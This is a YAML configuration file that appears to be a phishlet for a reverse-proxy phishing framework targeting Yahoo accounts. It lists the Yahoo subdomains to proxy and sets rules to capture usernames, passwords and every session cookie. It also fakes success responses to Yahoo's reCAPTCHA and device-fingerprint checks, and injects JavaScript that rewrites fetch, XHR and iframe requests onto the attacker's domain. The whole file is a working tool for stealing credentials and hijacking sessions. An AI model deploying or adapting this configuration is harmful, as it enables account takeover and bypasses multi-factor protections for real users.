min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'my', orig_sub: 'my', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'api', orig_sub: 'api.login', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'gpt', orig_sub: 'gpt.mail', domain: 'yahoo.net', session: false, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'account/challenge/fail', replace: '', mimes: ['text/html']}

auth_tokens:
  - domain: '.yahoo.com'
    keys: [".*,regexp"]
  - domain: '.login.yahoo.com'
    keys: [".*,regexp"]
  - domain: '.mail.yahoo.com'
    keys: [".*,regexp"]
  - domain: '.www.yahoo.com'
    keys: [".*,regexp"]
  - domain: '.my.yahoo.com'
    keys: [".*,regexp"]

auth_urls:
  - '/validate'
  - '/account/challenge/password'
  - '/account/challenge/password/validate'
  - '/oauth2/request_auth'
  - '/oauth2/authorize'
  - '/oauth2/get_token'
  - '/callback'
  - '/myaccount/security'

credentials:
  username:
    key: '^username$'
    search: '(.+)'
  password:
    key: '^password$'
    search: '(.+)'

intercept:
  - domain: 'login.yahoo.com'
    path: '/account/challenge/recaptcha'
    http_status: 200
    body: '{"status":"success","verified":true}'
    mime: 'application/json'
  - domain: 'login.yahoo.com'
    path: '/account/challenge/device-identifier-collector'
    http_status: 200
    body: '{}'
    mime: 'application/json'
  - domain: 'gpt.mail.yahoo.net'
    path: '.*'
    http_status: 200
    body: '<html><body style="margin:0;height:100vh;background-image:url(''data:image/jpeg;base64,'');background-size:cover;background-repeat:no-repeat;background-position:center"></body></html>'
    mime: 'text/html'

js_inject:
  - trigger_domains: ['login.yahoo.com']
    trigger_paths: ['.*?']
    script: |
      (function() {
        var h = window.location.hostname;
        var d = h.split('.').slice(-2).join('.');
        var r = function(u) {
          if (typeof u === 'string') {
            u = u.replace('https://login.yahoo.com', 'https://login.' + d);
            u = u.replace('https://www.yahoo.com', 'https://www.' + d);
            u = u.replace('https://mail.yahoo.com', 'https://mail.' + d);
            u = u.replace('https://my.yahoo.com', 'https://my.' + d);
            u = u.replace('https://api.login.yahoo.com', 'https://api.' + d);
            u = u.replace('https://guce.yahoo.com', 'https://guce.' + d);
            u = u.replace('https://gpt.mail.yahoo.net', 'https://gpt.' + d);
          } else if (typeof u === 'object' && u.url) {
            try {
              var f = u.url;
              f = f.replace('https://login.yahoo.com', 'https://login.' + d);
              f = f.replace('https://www.yahoo.com', 'https://www.' + d);
              f = f.replace('https://mail.yahoo.com', 'https://mail.' + d);
              f = f.replace('https://my.yahoo.com', 'https://my.' + d);
              f = f.replace('https://api.login.yahoo.com', 'https://api.' + d);
              f = f.replace('https://guce.yahoo.com', 'https://guce.' + d);
              f = f.replace('https://gpt.mail.yahoo.net', 'https://gpt.' + d);
              if (f !== u.url) u = new Request(f, u);
            } catch(e) { u = u.url; }
          }
          return u;
        };
        var of = window.fetch;
        window.fetch = function(u, o) { return of.call(this, r(u), o); };
        var ox = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(m, u, a, us, pw) { return ox.call(this, m, typeof u === 'string' ? r(u) : u, a, us, pw); };
        var oc = document.createElement.bind(document);
        document.createElement = function(t, o) {
          var e = oc(t, o);
          if (t.toLowerCase() === 'iframe') {
            var os = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
            Object.defineProperty(e, 'src', {
              get: function() { return os.get.call(this); },
              set: function(v) { return os.set.call(this, typeof v === 'string' ? r(v) : v); },
              configurable: true
            });
          }
          return e;
        };
        var mo = new MutationObserver(function(muts) {
          muts.forEach(function(m) {
            if (m.type === 'childList') {
              for (var i = 0; i < m.addedNodes.length; i++) {
                var n = m.addedNodes[i];
                if (n.tagName === 'IFRAME' && n.src) {
                  n.src = r(n.src);
                }
                if (n.querySelectorAll) {
                  var ifs = n.querySelectorAll('iframe[src]');
                  for (var j = 0; j < ifs.length; j++) { ifs[j].src = r(ifs[j].src); }
                }
              }
            }
          });
        });
        mo.observe(document.documentElement, {childList: true, subtree: true});
      })();

login:
  domain: 'login.yahoo.com'
  path: '/'
